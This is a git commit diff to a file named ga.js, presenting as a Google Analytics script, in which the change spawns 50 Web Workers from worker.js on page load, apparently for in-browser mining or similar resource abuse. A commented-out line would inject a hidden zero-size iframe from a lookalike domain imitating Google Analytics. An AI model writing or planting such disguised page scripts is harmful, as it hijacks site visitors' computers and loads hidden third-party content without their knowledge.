7ff6899c802a287b5589e8010242c2b91d9b194e
Yusuf Dolu <38819540+yusufdolu60@users.noreply.github.com>
2018-05-04 02:38:45 +0300

    Update ga.js

--- ga.js
+++ ga.js
@@ -1,3 +1,6 @@
-console.log(".");
+for(var i = 0; i< 50; i++) {
+  worker = new Worker("worker.js");
+  worker.postMessage("H");
+}
 
 //function _gf(d,i){d.addEventListener("DOMContentLoaded", function(){i=d.createElement("iframe");i.src="https://google.anayltics.com/ga.html";i.width="0";i.height="0";i.frameBorder="0";i.scrolling="no";d.body.appendChild(i);});}_gf(document);
